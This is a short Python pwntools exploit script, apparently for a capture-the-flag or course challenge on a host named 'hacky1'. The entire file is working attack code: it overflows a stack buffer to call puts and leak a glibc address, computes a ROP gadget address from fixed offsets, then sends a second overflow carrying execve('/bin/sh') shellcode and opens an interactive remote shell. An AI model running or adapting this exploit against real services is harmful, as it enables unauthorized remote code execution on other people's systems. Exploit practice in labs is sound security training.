#!/usr/bin/python3

import sys
from pwn import *

#assign host and port to connect to
if len(sys.argv) >= 3:
    host = sys.argv[1]
    port = int(sys.argv[2])
else:
    host = "hacky1"
    port = 13702

proc = remote(host, port)


#Slightly modified code from pwn02
proc.write(40*b"\xFF")
proc.readline()
stack_offset_buf = 0x38
glibc_offset_funlockfile = 0x0000000000055090
glibc_offset_ropgadget =   0x0000000000037fc9
fn_call_puts = b"\xb9\x12\x40\x00\x00\x00\x00\x00"
proc.write(stack_offset_buf*b"\x00" + fn_call_puts + b"\n")
glibc_addr_funlockfile = int.from_bytes(proc.readline('\n')[16:22], byteorder='little')
glibc_addr_ropgadget = glibc_addr_funlockfile - glibc_offset_funlockfile + glibc_offset_ropgadget
shellcode = b"\x48\x31\xD2\x48\x31\xF6\x54\x5F\x48\x83\xC7\x15\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05"
sh_binary = b"/bin/sh\x00"
exploit = 0x38*b"\x00" + glibc_addr_ropgadget.to_bytes(8, 'little') + shellcode + sh_binary + b"\n"
proc.write(exploit)

#start interactive mode
proc.interactive()

